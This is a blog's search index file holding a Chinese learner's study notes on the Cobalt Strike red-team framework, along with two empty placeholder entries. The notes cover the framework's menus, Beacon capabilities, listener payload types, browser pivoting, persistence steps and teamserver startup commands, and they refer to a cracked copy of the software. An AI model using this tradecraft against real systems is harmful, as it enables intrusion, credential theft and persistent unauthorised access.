<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++</title>
      <link href="2020/11/12/c-1/"/>
      <url>2020/11/12/c-1/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学过的东西做个记录 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C</title>
      <link href="2020/11/12/c/"/>
      <url>2020/11/12/c/</url>
      
        <content type="html"><![CDATA[<p>先写上，好逼着自己赶紧抽空把这么学习笔记给完成</p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 学过的东西做个记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cobaltstrike</title>
      <link href="2020/11/08/cobaltstrike/"/>
      <url>2020/11/08/cobaltstrike/</url>
      
        <content type="html"><![CDATA[<center>cobaltstrike学习笔记</center><h1 id="这是干啥的"><a href="#这是干啥的" class="headerlink" title="这是干啥的"></a>这是干啥的</h1><blockquote><p>C/S架构</p></blockquote><ol><li>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动</li></ol><h1 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h1><h2 id="Help"><a href="#Help" class="headerlink" title="Help"></a>Help</h2><table><thead><tr><th>Homepage</th><th>官方网站</th></tr></thead><tbody><tr><td>Support</td><td>技术支持，文档介绍</td></tr><tr><td>Arsenal</td><td>武器库工具集（需正版授权码）</td></tr><tr><td>System information</td><td>系统及版本信息</td></tr><tr><td>About</td><td>关于</td></tr></tbody></table><h2 id="Reporting"><a href="#Reporting" class="headerlink" title="Reporting"></a>Reporting</h2><table><thead><tr><th>Activity report</th><th>活动报告</th></tr></thead><tbody><tr><td>Hosts report</td><td>主机报告</td></tr><tr><td>Indicators of Compromise</td><td>威胁报告</td></tr><tr><td>Sessions report</td><td>会话报告</td></tr><tr><td>Social engineering report</td><td>社会工程学报告</td></tr><tr><td>Tactics, Techniques, and Procedures</td><td>策略、技巧和程序</td></tr><tr><td>Reset Data</td><td>重置数据</td></tr><tr><td>Export Data</td><td>导出数据</td></tr></tbody></table><h2 id="Attacks-gt-Web-Drive-by"><a href="#Attacks-gt-Web-Drive-by" class="headerlink" title="Attacks -&gt; Web Drive-by"></a>Attacks -&gt; Web Drive-by</h2><table><thead><tr><th>Manage</th><th>对开启的web服务进行管理</th></tr></thead><tbody><tr><td>Clone Site</td><td>克隆网站(可记录受害者提交的数据)</td></tr><tr><td>Host File</td><td>提供Web以供下载某文件</td></tr><tr><td>Scripted Web Delivery</td><td>提供Web服务，便于下载和执行PowerShell Payload，类似于Metasploit的web_delivery</td></tr><tr><td>Signed Applet Attack</td><td>启动一个Web服务以提供自签名Java Applet的运行环境</td></tr><tr><td>Smart Applet Attack</td><td>自动检测Java版本并利用已知的exploits绕过security</td></tr><tr><td>System Profiler</td><td>用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</td></tr></tbody></table><h2 id="Attacks-gt-Packages"><a href="#Attacks-gt-Packages" class="headerlink" title="Attacks -&gt; Packages"></a>Attacks -&gt; Packages</h2><table><thead><tr><th>HTML Application</th><th>生成恶意的HTA木马文件</th></tr></thead><tbody><tr><td>MS Office Macro</td><td>生成office宏病毒文件</td></tr><tr><td>Payload Generator</td><td>生成各种语言版本的payload</td></tr><tr><td>Windows Executable</td><td>生成Windows可执行payload</td></tr><tr><td>Windows Executable(S)</td><td>把包含payload,Stageless生成可执行文件(包含多数功能)</td></tr></tbody></table><h2 id="View"><a href="#View" class="headerlink" title="View"></a>View</h2><table><thead><tr><th>Applications</th><th>应用(显示受害者机器的应用信息)</th></tr></thead><tbody><tr><td>Credentials</td><td>凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里)</td></tr><tr><td>Downloads</td><td>下载文件</td></tr><tr><td>Event Log</td><td>事件日志(主机上线记录以及团队协作聊天记录)</td></tr><tr><td>Keystrokes</td><td>键盘记录</td></tr><tr><td>Proxy Pivots</td><td>代理模块</td></tr><tr><td>Screenshots</td><td>受害者机器屏幕截图</td></tr><tr><td>Script Console</td><td>脚本控制台(可以加载各种脚本，增强功能<a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="noopener">https://github.com/rsmudge/cortana-scripts</a>)</td></tr><tr><td>Targets</td><td>显示目标主机</td></tr><tr><td>Web Log</td><td>Web日志</td></tr></tbody></table><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><table><thead><tr><th>New Connection</th><th>新的连接(支持连接多个服务器端)</th></tr></thead><tbody><tr><td>Preferences</td><td>偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等)</td></tr><tr><td>Visualization</td><td>窗口视图模式(展示输出结果的形式)</td></tr><tr><td>VPN Interfaces</td><td>VPN接入</td></tr><tr><td>Listenrs</td><td>监听器(创建Listener)</td></tr><tr><td>Script Manager</td><td>脚本管理</td></tr><tr><td>Close</td><td>关闭客户端</td></tr></tbody></table><h1 id="参考（多看看，多跟着练一练加深理解）"><a href="#参考（多看看，多跟着练一练加深理解）" class="headerlink" title="参考（多看看，多跟着练一练加深理解）"></a>参考（多看看，多跟着练一练加深理解）</h1><ol><li><p><a href="https://www.4hou.com/posts/qD87" target="_blank" rel="noopener">https://www.4hou.com/posts/qD87</a></p></li><li><p><a href="https://xz.aliyun.com/t/7997" target="_blank" rel="noopener">https://xz.aliyun.com/t/7997</a></p></li><li><p><a href="https://www.freebuf.com/articles/web/246863.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/246863.html</a></p></li><li><p><a href="https://tophub.today/search?q=cobalt+strike" target="_blank" rel="noopener">https://tophub.today/search?q=cobalt+strike</a></p></li><li><p><a href="http://blog.nsfocus.net/cobalt-strike-phishing-0913/" target="_blank" rel="noopener">http://blog.nsfocus.net/cobalt-strike-phishing-0913/</a></p></li><li><p><a href="https://www.cobaltstrike.com/support" target="_blank" rel="noopener">https://www.cobaltstrike.com/support</a></p></li><li><p><a href="https://mp.weixin.qq.com/s/f6zQiRNDtCn9lQps3yeJGg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/f6zQiRNDtCn9lQps3yeJGg</a></p></li><li><p><a href="https://github.com/No-Github/1earn/blob/master/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/CobaltStrike.md" target="_blank" rel="noopener">https://github.com/No-Github/1earn/blob/master/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/CobaltStrike.md</a></p></li><li><p><a href="https://www.freebuf.com/column/149236.html" target="_blank" rel="noopener">https://www.freebuf.com/column/149236.html</a></p></li><li><p><a href="https://hub.packtpub.com/red-team-tactics-getting-started-with-cobalt-strike-tutorial/" target="_blank" rel="noopener">https://hub.packtpub.com/red-team-tactics-getting-started-with-cobalt-strike-tutorial/</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1666653" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1666653</a></p></li><li><p><a href="http://blog.leanote.com/post/snowming/50448511de58" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/50448511de58</a></p></li><li><p><a href="https://0verwatch.top/LAN-pentest-learning-7.html#Mimikatz" target="_blank" rel="noopener">https://0verwatch.top/LAN-pentest-learning-7.html#Mimikatz</a></p></li><li><p><a href="https://my.oschina.net/u/4587410/blog/4551030" target="_blank" rel="noopener">https://my.oschina.net/u/4587410/blog/4551030</a></p></li></ol><pre class=" language-bash"><code class="language-bash">  cobaltstrike4.0-cracked tree<span class="token keyword">.</span>├── CobaltstrikeCN.jar  <span class="token comment" spellcheck="true"># 汉化包</span>├── LICENSE.txt├── NOTICE.TXT├── agscript├── c2lint├── cobaltstrike.auth├── cobaltstrike.bat├── cobaltstrike.icns <span class="token comment" spellcheck="true"># 图标 无</span>├── cobaltstrike.jar <span class="token comment" spellcheck="true"># 主程序</span>├── cobaltstrike.store 无├── crackInfo.txt├── icon.jpg├── libicmp.so├── libicmp64.so├── libtapmanager.so├── libtapmanager64.so├── peclone├── readme.txt├── start.bat├── start.sh├── teamserver└── third-party    ├── README.winvnc.txt    ├── winvnc.x64.dll 无    └── winvnc.x86.dll 无1 directory, 24 files</code></pre><h1 id="攻击问题集"><a href="#攻击问题集" class="headerlink" title="攻击问题集 "></a>攻击问题集 <img src="C:%5CUsers%5CRESCUER%5CDesktop%5C%E6%94%BB%E5%87%BB%E9%97%AE%E9%A2%98%E9%9B%86.jpg" alt=""></h1><h1 id="cobaltstrike-Beacon"><a href="#cobaltstrike-Beacon" class="headerlink" title="cobaltstrike Beacon"></a>cobaltstrike Beacon</h1><p>功能：</p><ol><li>远程线程注入，可指定目标进程名称或pid；</li><li>Spawn，将beacon shell 派生至新的程序；</li><li>命名管道，连接、关闭指定命名管道，使用命名管道通信；</li><li>文件操作，上传与下载文件，修改文件时间；</li><li>文件系统操作，切换目录、创建删除文件夹、写入环境变量等；</li><li>命令行执行，直接执行指定的cmd命令；</li><li>网络监听，包括创建服务端并监听指定端口、本地网络通信转发等；</li><li>获取信息，查看所有进程信息，查看指定目录下文件信息；</li><li>创建服务，将指定程序以服务方式运行；</li><li>权限操作，包括检查权限，提升权限；</li><li>Shellcode执行，使用powershell通过指定端口下载并运行；</li><li>域内渗透，使用kerberos凭据</li></ol><h2 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h2><h3 id="4-0前"><a href="#4-0前" class="headerlink" title="4.0前"></a>4.0前</h3><ol><li><p>反向shell 和反向 HTTP C2 通道</p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107134207911.png" alt="image-20201107134207911"></p></li></ol><h3 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h3><h2 id="job命令"><a href="#job命令" class="headerlink" title="job命令"></a>job命令</h2><h2 id="desktop-命令"><a href="#desktop-命令" class="headerlink" title="desktop 命令"></a>desktop 命令</h2><blockquote><ol start="12"><li></li></ol></blockquote><h1 id="工具条"><a href="#工具条" class="headerlink" title="工具条"></a>工具条</h1><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201105213628666.png" alt="image-20201105213628666"></p><h1 id="Cobalt-Strike-桌面控制问题"><a href="#Cobalt-Strike-桌面控制问题" class="headerlink" title="Cobalt Strike 桌面控制问题"></a>Cobalt Strike 桌面控制问题</h1><h1 id="Browser-Pivoting（浏览器跳板攻击"><a href="#Browser-Pivoting（浏览器跳板攻击" class="headerlink" title="Browser Pivoting（浏览器跳板攻击)"></a>Browser Pivoting（浏览器跳板攻击)</h1><h2 id="概念相关"><a href="#概念相关" class="headerlink" title="概念相关"></a>概念相关</h2><blockquote><p>浏览器跳板攻击可以让攻击者以受害主机上的终端用户的身份来访问浏览器上开着的应用。攻击者可以继承目标用户对于网站的访问权限，相当于直接跳过了对于浏览器上的应用程序的身份验证</p></blockquote><img src="C:\Users\RESCUER\AppData\Roaming\Typora\typora-user-images\image-20201107145600156.png" alt="image-20201107145600156" style="zoom:80%;" /><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="socks-跳板-代理跳板"><a href="#socks-跳板-代理跳板" class="headerlink" title="socks 跳板/代理跳板"></a>socks 跳板/代理跳板</h3><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107145817937.png" alt="image-20201107145817937"></p><h2 id="为什么可以实现"><a href="#为什么可以实现" class="headerlink" title="为什么可以实现"></a>为什么可以实现</h2><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107145948865.png" alt="image-20201107145948865"></p><h3 id="winINet库"><a href="#winINet库" class="headerlink" title="winINet库"></a>winINet库</h3><blockquote><p>工作原理：</p><ol><li>进程注入。浏览器跳板技术将一个 agent（代理）注入到 IE 浏览器进程中；</li><li>在团队服务器上创建一个 HTTP 代理服务器。到时候攻击者通过请求此代理服<br>务器的 IP 和端口，进而变成了 agent 的一个请求任务；</li><li>当攻击者从自己的浏览器请求 web 应用时，IE 中的 agent （代理）将此请求<br>转化为对 WinINet 库的 API 调用；</li><li>恰好， WinINet 也是 IE 浏览器用于 web 通信和管理身份认证的库。Internet<br>Explorer 将其所有通信委托给 WinINet 库。并且使用 WinINet 这个库来管理<br>其用户的 cookies、SSL 会话和服务器身份验证；</li><li>基于相同的进程上下文，使用此库来进行一个 web 请求可以引发免费的透明<br>再验证。攻击者的 web 请求于是获取了终端用户的 cookies、SSL 会话和服务<br>器身份验证；</li><li>最终，攻击者的 web 请求就成为了当前开着的 IE 浏览器的进行的一个新的请<br>求。</li></ol></blockquote><ol start="2"><li>操作：<ol><li>设置浏览器跳板</li><li>通过 chromium 浏览器访问 web 应用</li></ol></li></ol><h2 id="通过-beacon-内置的-socks-功能将本地-Msf-直接代入目标内网进行操作"><a href="#通过-beacon-内置的-socks-功能将本地-Msf-直接代入目标内网进行操作" class="headerlink" title="通过 beacon 内置的 socks 功能将本地 Msf 直接代入目标内网进行操作"></a>通过 beacon 内置的 socks 功能将本地 Msf 直接代入目标内网进行操作</h2><blockquote><p>总结来说就是需要先有一个 CS Beacon shell，然后通过 socks 理，把受害主机的流量代理到本地的 msf，然后本地 msf 就可以进行一些内网探测或漏洞利用。</p><blockquote><blockquote><p>CS 的通讯模型中，客户端不会直接与 payload 进行连接，都是必须经过团队服务<br>器的。以团队服务器为中介，这是 CS 设计的一种的安全机制</p></blockquote></blockquote></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h2 id="借助-CS-的外部-tcp-监听器通过-ssh-隧道直接派生一个meterpreter-的-shell-到本地"><a href="#借助-CS-的外部-tcp-监听器通过-ssh-隧道直接派生一个meterpreter-的-shell-到本地" class="headerlink" title="借助 CS 的外部 tcp 监听器通过 ssh 隧道直接派生一个meterpreter 的 shell 到本地"></a>借助 CS 的外部 tcp 监听器通过 ssh 隧道直接派生一个meterpreter 的 shell 到本地</h2><blockquote><p>cs中可以用inject或spawn将payload注入到内存中</p></blockquote><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107180724328.png" alt="image-20201107180724328"></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ol><li>在本地 MSF 上创建监听器</li><li>给本地 MSF 一个公网地址</li><li>在 CS 上创建外部监听器</li><li>spawn</li></ol><h1 id="Aggressor-Script"><a href="#Aggressor-Script" class="headerlink" title="Aggressor Script"></a>Aggressor Script</h1><p><a href="https://www.cobaltstrike.com/aggressor-script/index.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/index.html</a></p><h1 id="团队服务器隐匿"><a href="#团队服务器隐匿" class="headerlink" title="团队服务器隐匿"></a>团队服务器隐匿</h1><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107142843569.png" alt="image-20201107142843569"></p><h1 id="Cobalt-Strike-中的权限维持和团队服务器之间的会话传递"><a href="#Cobalt-Strike-中的权限维持和团队服务器之间的会话传递" class="headerlink" title="Cobalt Strike 中的权限维持和团队服务器之间的会话传递"></a>Cobalt Strike 中的权限维持和团队服务器之间的会话传递</h1><p><a href="https://github.com/DeEpinGh0st/Erebus" target="_blank" rel="noopener">https://github.com/DeEpinGh0st/Erebus</a></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><blockquote><p>前提：Beacon Shell 必须是高权限，不然通过 SC 命令加服务的话不会成功</p></blockquote><p>操作步骤：</p><ol><li>加载 cna 脚本：Cobalt Strike → Script Manager → Load → Erebus 中的 Main.cna</li><li>生成 Payload 可执行文件：Attacks<code>→</code>Packages<code>→</code>Windows Executable(S)</li><li>上传 payload 可执行文件至目标主机</li><li>通过插件添加服务</li><li>重启目标机器测试 Beacon 留存</li></ol><h2 id="在团队服务器之间传递-Beacon-Shell"><a href="#在团队服务器之间传递-Beacon-Shell" class="headerlink" title="在团队服务器之间传递 Beacon Shell"></a>在团队服务器之间传递 Beacon Shell</h2><p>步骤：</p><ol><li>准备工作 —— 把 Beacon 转移到更安全的进程上</li><li>第一步：准备工作 —— 把 Beacon 转移到更安全的进程上</li><li>把会话传递到另一台团队服务器上</li></ol><h1 id="Cobalt-Strike-amp-MetaSploit-联动"><a href="#Cobalt-Strike-amp-MetaSploit-联动" class="headerlink" title="Cobalt Strike &amp; MetaSploit 联动"></a>Cobalt Strike &amp; MetaSploit 联动</h1><blockquote><p>流量转发</p></blockquote><h1 id="使用-Cobalt-Strike-对-Linux-主机进行后渗透"><a href="#使用-Cobalt-Strike-对-Linux-主机进行后渗透" class="headerlink" title="使用 Cobalt Strike 对 Linux 主机进行后渗透"></a>使用 Cobalt Strike 对 Linux 主机进行后渗透</h1><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h1><h2 id="spear-phishing"><a href="#spear-phishing" class="headerlink" title="spear phishing"></a>spear phishing</h2><h2 id="tradecraft"><a href="#tradecraft" class="headerlink" title="tradecraft"></a>tradecraft</h2><h2 id="client-side-attack-process"><a href="#client-side-attack-process" class="headerlink" title="client-side attack process"></a>client-side attack process</h2><h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h1><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h1 id="MSF-sleep与CobaltStrike-sleep"><a href="#MSF-sleep与CobaltStrike-sleep" class="headerlink" title="MSF sleep与CobaltStrike sleep"></a>MSF sleep与CobaltStrike sleep</h1><p><a href="https://www.anquanke.com/post/id/216363" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216363</a></p><h1 id="execute-assembly"><a href="#execute-assembly" class="headerlink" title="execute-assembly"></a>execute-assembly</h1><p><a href="https://www.anquanke.com/post/id/220456" target="_blank" rel="noopener">https://www.anquanke.com/post/id/220456</a></p><h1 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h1><h2 id="host-and-user-enumeration"><a href="#host-and-user-enumeration" class="headerlink" title="host and user enumeration"></a>host and user enumeration</h2><h2 id="remote-control-of-systems"><a href="#remote-control-of-systems" class="headerlink" title="remote control of systems"></a>remote control of systems</h2><h2 id="remote-code-execution-with-the-Beacon-payload"><a href="#remote-code-execution-with-the-Beacon-payload" class="headerlink" title="remote code execution with the Beacon payload"></a>remote code execution with the Beacon payload</h2><h2 id="steal-tokens"><a href="#steal-tokens" class="headerlink" title="steal tokens"></a>steal tokens</h2><h2 id="use-credentials"><a href="#use-credentials" class="headerlink" title="use credentials"></a>use credentials</h2><h2 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass-the-hash"></a>pass-the-hash</h2><h2 id="generate-Kerberos-Golden-这个还真没明白什么意思"><a href="#generate-Kerberos-Golden-这个还真没明白什么意思" class="headerlink" title="generate Kerberos Golden(这个还真没明白什么意思)"></a>generate Kerberos Golden(这个还真没明白什么意思)</h2><h1 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h1><h2 id="创建监听器9中payload选项"><a href="#创建监听器9中payload选项" class="headerlink" title="创建监听器9中payload选项"></a>创建监听器9中payload选项</h2><h3 id="内部的Listener"><a href="#内部的Listener" class="headerlink" title="内部的Listener"></a>内部的Listener</h3><blockquote><p>Beacon为内置的Listener即在目标主机执行相应的payload，获取shell到CS上</p><p>其中包含DNS、HTTP、HTTPS、SMB</p><p>Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS</p><p>其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询</p><p>目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯</p><p>通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用Beacon了。</p></blockquote><ul><li>windows/beacon_dns/reverse_dns_txt</li><li>windows/beacon_dns/reverse_http</li><li>windows/beacon_http/reverse_http</li><li>windows/beacon_https/reverse_https </li><li>windows/beacon_smb/bind_pipe</li></ul><h3 id="外部的Listener"><a href="#外部的Listener" class="headerlink" title="外部的Listener"></a>外部的Listener</h3><blockquote><p>Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。</p></blockquote><ul><li>windows/foreign/reverse_dns_txt</li><li>windows/foreign/reverse_http</li><li>windows/foreign/reverse_https</li><li>windows/foreign/reverse_tcp</li></ul><h1 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h1><h2 id="find-targets-with-port-scanning"><a href="#find-targets-with-port-scanning" class="headerlink" title="find targets with port scanning"></a>find targets with port scanning</h2><h2 id="how-to-pivot-to-and-control-UNIX-targets-with-Cobalt-Strike’s-SSH-sessions"><a href="#how-to-pivot-to-and-control-UNIX-targets-with-Cobalt-Strike’s-SSH-sessions" class="headerlink" title="how to pivot to and control UNIX targets with Cobalt Strike’s SSH sessions"></a>how to pivot to and control UNIX targets with Cobalt Strike’s SSH sessions</h2><h1 id="启动命令"><a href="#启动命令" class="headerlink" title="启动命令"></a>启动命令</h1><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /Users/sec/Documents/Sec/cobaltstrike4.0-cracked <span class="token operator">&amp;&amp;</span> java -Xdock:icon<span class="token operator">=</span>cobaltstrike.icns -Dfile.encoding<span class="token operator">=</span>UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads<span class="token operator">=</span>4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jarjava -XX:ParallelGCThreads<span class="token operator">=</span>4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</code></pre><h1 id="分布式和团队行动"><a href="#分布式和团队行动" class="headerlink" title="分布式和团队行动"></a>分布式和团队行动</h1><ol><li><p><code>分布式行动模型</code>：架构多台团队服务器，也<br>就是分解整个攻击链，这是分布式行动模型的<code>基本思想</code></p></li><li></li><li><blockquote><p>一旦连接至一个团队服务器，你的团队将：<br>使用相同的会话<br>分享主机、捕获的数据和下载的文件<br>通过一个共享的事件日志交流</p></blockquote></li></ol><h2 id="日志和报告功能"><a href="#日志和报告功能" class="headerlink" title="日志和报告功能"></a>日志和报告功能</h2><h3 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h3><h3 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h3><h2 id="最基本的多团队服务器模型"><a href="#最基本的多团队服务器模型" class="headerlink" title="最基本的多团队服务器模型"></a>最基本的多团队服务器模型</h2><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107132806747.png" alt="image-20201107132806747"></p><h2 id="结合攻击链的多团队服务器模型："><a href="#结合攻击链的多团队服务器模型：" class="headerlink" title="结合攻击链的多团队服务器模型："></a>结合攻击链的多团队服务器模型：</h2><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107132948410.png" alt="image-20201107132948410"></p><h2 id="具有权限管理单元的多团队服务器模型"><a href="#具有权限管理单元的多团队服务器模型" class="headerlink" title="具有权限管理单元的多团队服务器模型"></a>具有权限管理单元的多团队服务器模型</h2><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107133335118.png" alt="image-20201107133335118"></p><h1 id="teamserver"><a href="#teamserver" class="headerlink" title="teamserver"></a>teamserver</h1><ol><li><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">.</span><span class="token operator">/</span>teamserver <span class="token operator">&lt;</span>host<span class="token operator">></span> <span class="token operator">&lt;</span>password<span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span>c2<span class="token punctuation">.</span>profile<span class="token punctuation">]</span> <span class="token punctuation">[</span>YYYY<span class="token operator">-</span>MM<span class="token operator">-</span>DD<span class="token punctuation">]</span><span class="token operator">&lt;</span>host<span class="token operator">></span> 必需参数 团队服务器IP<span class="token operator">&lt;</span>password<span class="token operator">></span> 必需参数 连接服务器的密码<span class="token punctuation">[</span><span class="token operator">/</span>path<span class="token operator">/</span>to<span class="token operator">/</span>c2<span class="token punctuation">.</span>profile<span class="token punctuation">]</span> 可选参数 指定C2通信配置文件，体现其强大的扩展性<span class="token punctuation">[</span>YYYY<span class="token operator">-</span>MM<span class="token operator">-</span>DD<span class="token punctuation">]</span> 可选参数 所有payload的终止时间# 启动Team Server<span class="token punctuation">.</span><span class="token operator">/</span>teamserver <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">183.147</span> <span class="token number">123456</span> # kali的IP地址 设置强密码，否则容易被爆破，参考附录</code></pre></li></ol><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><ol><li>Linux：./cobaltstrike或 java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar Windows：双击cobaltstrike.exe</li></ol><h1 id="Infrastructure"><a href="#Infrastructure" class="headerlink" title="Infrastructure"></a>Infrastructure</h1><h2 id="THE-PEER-TO-PEER-SMB"><a href="#THE-PEER-TO-PEER-SMB" class="headerlink" title="THE PEER-TO-PEER SMB"></a>THE PEER-TO-PEER SMB</h2><h3 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h3><h3 id="命名管道（name-pipe）"><a href="#命名管道（name-pipe）" class="headerlink" title="命名管道（name pipe）"></a>命名管道（name pipe）</h3><h4 id="通过windowsapi实现命名管道来控制计算机通信"><a href="#通过windowsapi实现命名管道来控制计算机通信" class="headerlink" title="通过windowsapi实现命名管道来控制计算机通信"></a>通过windowsapi实现命名管道来控制计算机通信</h4><ol><li><p>make_token()</p></li><li><p>LogonUserA()</p><p><a href="https://rcoil.me/2019/12/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91SCshell%20%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/" target="_blank" rel="noopener">https://rcoil.me/2019/12/%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91SCshell%20%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82/</a></p></li></ol><h2 id="TCP-Beacons"><a href="#TCP-Beacons" class="headerlink" title="TCP Beacons"></a>TCP Beacons</h2><h2 id="External-C2（外部C2）"><a href="#External-C2（外部C2）" class="headerlink" title="External C2（外部C2）"></a>External C2（外部C2）</h2><p><a href="http://blog.leanote.com/post/snowming/50448511de58" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/50448511de58</a></p><blockquote><p> Command &amp; Control Server (命令与控制服务器)</p></blockquote><ol><li><p>未来：基于但不限于框架、使用多种方法、拓展协议实现C2 通信</p></li><li><p>基于外部C2的CS通信模型</p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107134614583.png" alt="image-20201107134614583"></p></li><li><p>实现</p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107135010939.png" alt="image-20201107135010939"></p></li><li><p>使用外部C2的CS通信架构模型</p><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201107135305356.png" alt="image-20201107135305356"></p></li></ol><h1 id="Malleable-C2-Profile-功能"><a href="#Malleable-C2-Profile-功能" class="headerlink" title="Malleable C2 Profile 功能"></a>Malleable C2 Profile 功能</h1><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><blockquote><ol><li>./teamserver [团队服务器的 IP] [password] [c2 profile]</li><li>比起来，可拓展 C2 的好处就是配置简单，外部 C2 的好处是隐蔽性更好、绕防火<br>墙等限制的效果更好，可以拓展协议，但是实现起来比较难</li></ol></blockquote><h1 id="man-in-the-middle-attacks"><a href="#man-in-the-middle-attacks" class="headerlink" title="man-in-the-middle attacks"></a>man-in-the-middle attacks</h1><h1 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h1><ol><li><p>![image-20201105142601374](C:\Users\RESCUER\AppData\Roaming\Typora\typora-user-images\image-20201105142601374.png</p></li><li><p><img src="C:%5CUsers%5CRESCUER%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201105142653105.png" alt="image-20201105142653105"></p></li><li><blockquote><p>CS 转发流量到 MSF（或相反的方向），流量是 MSF 和 CS 客户端直连呢？还是走的 CS 的团队服务器进行转发呢？</p><blockquote><blockquote><p>CS 与 MSF 之间的流量转发，其实是 CS 团队服务器与 MSF 之间的流量转发。客户端作为第三方只是与 CS 团队服务器进行交互</p></blockquote></blockquote></blockquote></li></ol><h1 id="学着用用"><a href="#学着用用" class="headerlink" title="学着用用"></a>学着用用</h1><ol><li><p>成功启动步骤</p><ol><li><p>ip addr</p><blockquote><p>查看kali机器ip地址</p></blockquote></li><li><p>nohup ./teamserver 